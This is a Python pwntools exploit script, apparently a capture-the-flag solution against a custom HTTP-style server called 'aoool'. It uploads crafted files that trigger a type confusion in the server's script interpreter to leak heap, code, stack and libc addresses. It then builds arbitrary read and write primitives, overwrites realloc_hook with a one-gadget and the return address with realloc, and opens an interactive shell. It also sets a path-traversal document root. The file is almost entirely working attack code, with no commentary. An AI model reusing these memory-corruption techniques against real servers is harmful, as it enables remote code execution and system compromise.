#!/usr/bin/env python
import sys, os
from pwn import *
from shellcodes import orw
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
context.arch = "amd64"

def upload_file(data):
    r.send('UF / HTTP/1.1\r\n')
    r.send('Host: aoool.ng\r\n')
    r.send('Content-Length: {}\r\n'.format(len(data)))
    r.send('\r\n')
    r.send(data)

def update_config(config):
    r.send('UC / HTTP/1.1\r\n')
    r.send('Content-Length: {}\r\n'.format(len(config)))
    r.send('Host: aoool.ng\r\n')
    r.send('\r\n')
    r.send(config)

def get(path):
    r.send('GET {} HTTP/1.1\r\n'.format(path))
    r.send('Host: aoool.ng\r\n')
    r.send('\r\n')

r = remote(HOST, PORT)

_ = '''
server {
    server_name "aoool.ng";
    root "../../../../../../";
    mode osl;
}
'''

leakheap = '''
a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
c = "ppp";
f=56746;
f = "aaaaaaaaaaaaaa";
c = "aaaaaaaabbbbbbbb";
c = "aaaaaaaabbddddddddd";
c = "aaaaaaaabbbbbbbb\\x10" ;
print f;
'''
upload_file(leakheap)
update_config(_)
r.recvuntil("Connection: close")
r.recvuntil("\n")
r.recvuntil("\n")
filename = r.recvuntil("HTTP")[:-4]
get('/aoool/var/www/uploads/' + filename)

r.recvuntil("Connection: close")
r.recvuntil("Connection: close")
r.recvuntil("\n")
r.recvuntil("\n")
heap = u64(r.recvuntil("\n")[:8]) - 0x16ca0
print "heap,",hex(heap)

leakmmap = '''
a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
c = "ppp";
f=56746;
f = "aaaaaaaaaaaaaa";
c = "aaaaaaaabbbbbbbb";
c = "aaaaaaaabbddddddddd";
c = "aaaaaaaabbbbbbbb\\x30" ;
print f;
'''

upload_file(leakmmap)
r.recvuntil("Connection: close")
r.recvuntil("\n")
r.recvuntil("\n")
filename = r.recv(10)
get('/aoool/var/www/uploads/' + filename)
r.recvuntil("Connection: close")
r.recvuntil("\n")
r.recvuntil("\n")
mmap = u64(r.recvuntil("\n")[:8]) - 0x40
print "jit:",hex(mmap)


def readmem(addr):
    t = ""
    for c in p64(addr) :
        t += "\\x%02x" % ord(c)
    remem = '''
    a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    c = "ppp";
    f=56746;

    f = "aaaaaaaaaaaaaa";
    d=%lu;
    c = "aaaaaaaabbbbbbbb";
    c = "aaaaaaaabbddddddddd";
    c = "aaaaaaaabbbbbbbb\\x78" ;
    f = "x";
    print d;
    ''' % addr
    upload_file(remem)
    r.recvuntil("Connection: close")
    r.recvuntil("\n")
    r.recvuntil("\n")
    filename = r.recv(10)
    get('/aoool/var/www/uploads/' + filename)
    r.recvuntil("Connection: close")
    r.recvuntil("\n")
    r.recvuntil("\n")
    return u64(r.recvuntil("\n")[:8])    

def writemem(addr,data):
    t = ""
    for c in data:
        t += "\\x%02x" % ord(c)
    remem = '''
    a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    c = "ppp";
    f=56746;
    f = "aaaaaaaaaaaaaa";
    d=%lu;
    c = "aaaaaaaabbbbbbbb";
    c = "aaaaaaaabbddddddddd";
    c = "aaaaaaaabbbbbbbb\\x78" ;
    f = "x";
    d = "%s";
    ''' % (addr,t)
    upload_file(remem)
    r.recvuntil("Connection: close")
    r.recvuntil("\n")
    r.recvuntil("\n")
    filename = r.recv(10)
    get('/aoool/var/www/uploads/' + filename)

v = readmem(mmap)
code  = readmem(v+0x78) - 0x1822a
stack = readmem(v+0x68)
libc = readmem(code+0x22cf98) - 0x1108c0
print "code:",hex(code)
print "stack:",hex(stack)
print "libc:",hex(libc)
ret_addr = stack + 0x7d8
free_hook = libc + 0x3ed8e8
realloc_hook = libc + 0x3ebc28
malloc_hook = libc + 0x3ebc30
magic = libc + 0x10a38c
realloc = libc + 0x98c3a
malloc = libc + 0x97070
malloc_hook = libc + 0x3ebc30
writemem(realloc_hook,p64(magic)[:6])

r.recvuntil("Connection: close")
r.recvuntil("\n")
r.recvuntil("\n")
writemem(ret_addr,p64(realloc))

r.interactive()




